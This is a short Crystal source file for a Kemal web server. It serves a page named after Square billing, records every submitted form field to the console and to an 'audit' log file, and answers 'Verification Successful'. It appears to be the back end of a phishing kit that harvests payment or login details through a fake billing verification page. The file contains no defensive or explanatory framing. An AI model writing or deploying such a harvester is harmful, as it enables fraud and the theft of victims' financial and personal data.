require "kemal"
require "json"
require "log"

# ---- Config ----
PORT = (ENV["PORT"]? || "1488").to_i
AUDIT_LOG = ENV["AUDIT_LOG"]? || "audit_logs.txt"

# ---- Logging ----
Log.setup do |config|
  backend = Log::IOBackend.new(STDOUT)
  config.bind "kemal", :info, backend
end

LOGGER = Log.for("kemal")

# ---- Routes ----

get "/" do
  render "views/square_billing.ecr"
end

post "/submit" do |ctx|
  data = ctx.params.to_h

  LOGGER.info { "Received: #{data}" }

  File.open(AUDIT_LOG, "a") do |f|
    f.puts data.to_json
  end

  "Verification Successful"
end

# ---- Start Server ----
Kemal.config.port = PORT
Kemal.run
